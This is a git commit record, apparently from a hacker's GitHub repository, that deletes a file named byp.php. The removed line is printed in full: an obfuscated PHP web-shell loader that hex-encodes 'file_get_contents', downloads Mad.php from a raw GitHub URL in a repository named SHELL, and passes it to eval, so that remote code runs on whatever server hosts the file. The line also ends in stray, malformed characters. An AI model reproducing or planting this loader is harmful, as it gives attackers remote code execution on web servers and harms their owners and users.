cd561440bd566758381e2dc3ce6e64931bdf21ea
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2023-07-02 02:41:08 +0700

    Delete byp.php

--- byp.php
+++
@@ -1,1 +0,0 @@
-<?php $MEMEKCYNA= "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"; eval("?>".$MEMEKCYNA("https://raw.githubusercontent.com/sniper404ghostxploit/SHELL/main/Mad.php"));?>")); ?>
